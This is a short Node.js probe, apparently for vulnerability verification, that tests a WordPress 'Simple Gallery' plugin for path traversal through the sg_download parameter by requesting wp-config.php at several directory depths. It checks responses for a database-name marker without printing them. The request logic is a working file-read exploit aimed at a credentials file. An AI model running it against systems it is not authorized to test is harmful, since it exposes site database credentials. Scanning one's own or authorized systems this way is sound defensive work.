// Exploit-verification probe: Simple Gallery <= 2.0.0 path traversal via ?sg_download=
// Usage: node probe.mjs <base-url>
// Exit 0 = target is vulnerable (arbitrary file read confirmed)
// Exit 1 = target is not vulnerable (traversal rejected / fixed)
// Exit 2 = usage or network error
//
// Read-only: sends GET requests only to the given base URL. Writes nothing and
// changes no server state. Response bodies are checked for a marker and not printed.

const base = process.argv[2];
if (!base) {
	console.error('usage: node probe.mjs <base-url>');
	process.exit(2);
}

let root;
try {
	root = new URL(base);
} catch {
	console.error('invalid base URL');
	process.exit(2);
}
if (root.protocol !== 'http:' && root.protocol !== 'https:') {
	console.error('base URL must be http(s)');
	process.exit(2);
}

// Marker that only appears when wp-config.php is actually read. The value itself is not printed.
const MARKER = /define\(\s*['"]DB_NAME['"]/;

// Upload dir is wp-content/uploads/simple-gallery/, so ../../../ reaches the WordPress root.
// Try a few depths in case the install layout differs.
const DEPTHS = [3, 2, 4, 1, 5, 6];

async function tryDepth(depth) {
	const target = new URL(root.href);
	target.searchParams.set('sg_download', '../'.repeat(depth) + 'wp-config.php');
	const res = await fetch(target, {
		method: 'GET',
		redirect: 'manual',
		signal: AbortSignal.timeout(15000),
	});
	const body = await res.text();
	return res.status === 200 && MARKER.test(body);
}

let vulnerable = false;
try {
	for (const depth of DEPTHS) {
		if (await tryDepth(depth)) {
			vulnerable = true;
			console.log(`VULNERABLE: sg_download traversal (depth ${depth}) returned wp-config.php contents`);
			break;
		}
	}
} catch (err) {
	console.error(`network error: ${err && err.message ? err.message : err}`);
	process.exit(2);
}

if (vulnerable) {
	process.exit(0);
}
console.log('NOT VULNERABLE: traversal to wp-config.php was not readable');
process.exit(1);
